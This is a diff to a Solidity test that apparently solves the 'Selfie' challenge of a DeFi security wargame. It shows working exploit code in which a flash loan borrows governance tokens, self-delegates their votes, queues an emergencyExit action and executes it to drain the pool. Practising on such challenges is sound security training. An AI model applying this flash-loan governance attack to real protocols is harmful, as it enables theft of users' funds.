@@ -72,15 +72,20 @@ contract SelfieChallenge is Test {
     function test_selfie() public 
     checkSolvedByPlayer 
     {
-        // deploy borrower contract
-        Borrower borrower = new Borrower(address(governance), address(pool), recovery);
+        
+        Borrower borrower = new Borrower();
 
-        // request a flashloan (the callback 'onFlashLoan' has the logic the queue our malicious action) 
-        pool.flashLoan(borrower, address(token), pool.maxFlashLoan(address(token)), '');
-        // after delay period ends, execute the action
+        // pass queueAction call on the data param of `flashLoan`
+        bytes memory attack_data = abi.encodeWithSignature('emergencyExit(address)', recovery);
+        bytes memory callback_data = abi.encodeWithSignature('queueAction(address,uint128,bytes)', pool, 0, attack_data);
+        // add the governance address at the end of the data to retrieve it on `onFlashLoan`
+        callback_data = abi.encodePacked(callback_data, address(governance));
+        pool.flashLoan(borrower, address(token), pool.maxFlashLoan(address(token)), callback_data);
+
         vm.warp(2 days + 1);
         governance.executeAction(1);
     }
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -94,29 +99,18 @@ contract SelfieChallenge is Test {
 
 
 contract Borrower is IERC3156FlashBorrower {
-    SimpleGovernance gov;
-    address pool;
-    address recovery;
-
-    constructor(address _gov, address _pool, address _recovery){
-        gov = SimpleGovernance(_gov);
-        pool = _pool;
-        recovery = _recovery;
-    }
-
     function onFlashLoan(
         address /*initiator*/,
         address token,
         uint256 amount,
         uint256 /*fee*/,
-        bytes calldata /*data*/
+        bytes calldata data
     ) external returns (bytes32) {
-        // delegate the borrowed tokens to 'this' (so `token.getVotes` returns such amount) 
         DamnValuableVotes(token).delegate(address(this));
-        // prepare malicious call data
-        bytes memory data = abi.encodeWithSignature('emergencyExit(address)', recovery);
-        // queue the action
-        gov.queueAction(pool,0,data);
+        
+        address target = address(bytes20(data[data.length-20:]));
+        target.call(data);
+
         // approve and return to avoid tx to fail 
         DamnValuableVotes(token).approve(msg.sender, amount);
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
